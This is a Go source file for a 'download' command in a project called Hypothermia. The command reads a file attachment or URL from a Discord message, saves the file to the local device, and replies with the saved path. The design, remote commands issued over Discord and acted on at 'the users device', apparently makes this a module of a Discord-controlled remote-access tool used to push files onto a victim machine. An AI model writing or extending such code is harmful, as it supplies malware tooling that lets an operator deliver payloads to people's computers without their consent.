package commands

import (
	"Hypothermia/src/utils"
	"fmt"
	"strings"

	"github.com/bwmarrin/discordgo"
)

const (
	dwNoFileError string = "🟥 You need reply to a file."
	dwSuccess     string = "🟩 Successfully downloaded file to: "
)

type DownloadCommand struct{}

func (*DownloadCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) error {
	if m.MessageReference == nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, dwNoFileError, m.Reference())
		return err
	}

	var fileURL string
	msg, _ := s.ChannelMessage(m.MessageReference.ChannelID, m.MessageReference.MessageID)

	if len(msg.Attachments) > 0 {
		fileURL = msg.Attachments[0].URL
	}

	if fileURL == "" {
		words := strings.Fields(msg.Content)
		for _, word := range words {
			if strings.HasPrefix(word, "http://") || strings.HasPrefix(word, "https://") {
				fileURL = word
				break
			}
		}
	}

	if fileURL == "" {
		_, err := s.ChannelMessageSendReply(m.ChannelID, dwNoFileError, m.Reference())
		return err
	}

	path, err := utils.DonwloadFile(fileURL)
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(err), m.Reference())
		return err
	}

	_, err = s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(dwSuccess, path), m.Reference())
	return err
}

func (*DownloadCommand) Name() string {
	return "download"
}

func (*DownloadCommand) Info() string {
	return "downloads a file to the users device"
}
